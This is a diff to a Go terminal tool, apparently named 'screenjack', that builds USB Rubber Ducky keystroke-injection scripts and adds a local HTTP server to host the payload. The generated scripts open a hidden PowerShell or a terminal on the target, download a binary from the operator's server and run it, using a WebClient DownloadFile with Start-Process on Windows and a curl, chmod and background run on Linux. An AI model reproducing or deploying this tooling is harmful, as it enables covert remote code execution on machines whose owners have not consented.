@@ -115,6 +115,9 @@ type Model struct {
 	addingAsset bool
 	assetInput  textinput.Model
 	assetMsg    string
+	// HTTP server
+	server   *Server
+	serverIP string
 }
 
 type buildDone struct{ ok bool; msg, log string }
@@ -194,6 +197,8 @@ func newModel() Model {
 		duckyOS:       cfg.Ducky.OS,
 		urlInput:      url,
 		payloadInput:  payload,
+		server:        NewServer(),
+		serverIP:      GetLocalIP(),
 		selectedAsset: cfg.Asset,
 	}
 }
@@ -378,6 +383,7 @@ func (m Model) keys(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 	switch k {
 	case "q", "ctrl+c":
 		m.saveConfig()
+		m.server.Stop()
 		return m, tea.Quit
 	case "tab":
 		m.section = (m.section + 1) % 3
@@ -402,6 +408,24 @@ func (m Model) keys(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 	case "l":
 		if m.buildLog != "" {
 			m.showLog = true
+		}
+		return m, nil
+	case "h":
+		if m.server.IsRunning() {
+			m.server.Stop()
+		} else {
+			payloadPath, ok := PayloadExists(m.duckyOS)
+			if !ok {
+				m.buildMsg = errorStyle.Render("no payload built")
+				return m, nil
+			}
+			assetPath := ""
+			if m.selectedAsset != "" {
+				assetPath = "../assets/" + m.selectedAsset
+			}
+			if err := m.server.Start(payloadPath, assetPath); err != nil {
+				m.buildMsg = errorStyle.Render(err.Error())
+			}
 		}
 		return m, nil
 	}
@@ -538,18 +562,41 @@ func (m Model) keys(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 
 func (m Model) genDucky() {
 	var b strings.Builder
-	url := strings.TrimSuffix(m.urlInput.Value(), "/") + "/" + m.payloadInput.Value()
 
-	b.WriteString(fmt.Sprintf("REM screenjack - %s\nDELAY 500\n\n", m.duckyOS))
+	// Use server IP:port if running, otherwise use configured URL
+	baseURL := m.urlInput.Value()
+	if m.server.IsRunning() {
+		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
+	}
+	url := strings.TrimSuffix(baseURL, "/") + "/" + m.payloadInput.Value()
+
+	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
+	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
+	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
+	b.WriteString("DELAY 500\n\n")
+
 	if m.duckyOS == "windows" {
-		b.WriteString("GUI r\nDELAY 300\nSTRING powershell -w hidden\nENTER\nDELAY 500\n")
-		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\nENTER\n",
+		b.WriteString("REM Open hidden PowerShell\n")
+		b.WriteString("GUI r\n")
+		b.WriteString("DELAY 300\n")
+		b.WriteString("STRING powershell -w hidden\n")
+		b.WriteString("ENTER\n")
+		b.WriteString("DELAY 500\n\n")
+		b.WriteString("REM Download and execute\n")
+		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
 			url, m.payloadInput.Value()))
+		b.WriteString("ENTER\n")
 	} else {
-		b.WriteString("CTRL-ALT t\nDELAY 500\n")
+		b.WriteString("REM Open terminal\n")
+		b.WriteString("CTRL-ALT t\n")
+		b.WriteString("DELAY 500\n\n")
+		b.WriteString("REM Download, chmod, execute in background\n")
 		name := m.payloadInput.Value()
-		b.WriteString(fmt.Sprintf("STRING curl -s %s -o /tmp/%s && chmod +x /tmp/%s && /tmp/%s &\nENTER\nDELAY 200\nSTRING exit\nENTER\n",
-			url, name, name, name))
+		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, name, name))
+		b.WriteString("ENTER\n")
+		b.WriteString("DELAY 300\n")
+		b.WriteString("STRING exit\n")
+		b.WriteString("ENTER\n")
 	}
 
 	os.MkdirAll("../ducky", 0755)
@@ -578,17 +625,21 @@ func (m Model) View() string {
 
 	// Status line
 	linuxOK, winOK := "—", "—"
-	if _, err := os.Stat("../payload/target/x86_64-unknown-linux-musl/release/screenjack"); err == nil {
+	if _, err := os.Stat("../dist/screenjack-linux"); err == nil {
 		linuxOK = successStyle.Render("●")
 	}
-	if _, err := os.Stat("../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"); err == nil {
+	if _, err := os.Stat("../dist/screenjack.exe"); err == nil {
 		winOK = successStyle.Render("●")
 	}
 	assetInfo := fmt.Sprintf("%d", len(m.assets))
 	if m.selectedAsset != "" {
 		assetInfo = successStyle.Render(m.selectedAsset)
 	}
-	status := mutedStyle.Render(fmt.Sprintf("linux:%s  win:%s  asset:%s", linuxOK, winOK, assetInfo))
+	serverInfo := "off"
+	if m.server.IsRunning() {
+		serverInfo = successStyle.Render(fmt.Sprintf("%s:%d", m.serverIP, m.server.Port()))
+	}
+	status := mutedStyle.Render(fmt.Sprintf("linux:%s  win:%s  asset:%s  http:%s", linuxOK, winOK, assetInfo, serverInfo))
 
 	// Panels
 	buildBox := m.renderBuild(colW)
@@ -612,7 +663,7 @@ func (m Model) View() string {
 		help = mutedStyle.Render("enter:confirm  esc:cancel")
 	} else {
 		row1 := "tab:section  j/k:nav  space:select  a:add  e:edit  p:preview"
-		row2 := "o:open folder  r:refresh  b:build  l:logs  g:gen  q:quit"
+		row2 := "o:open  b:build  h:http  l:logs  g:gen  r:refresh  q:quit"
 		help = mutedStyle.Render(row1) + "\n" + mutedStyle.Render(row2)
 	}
 
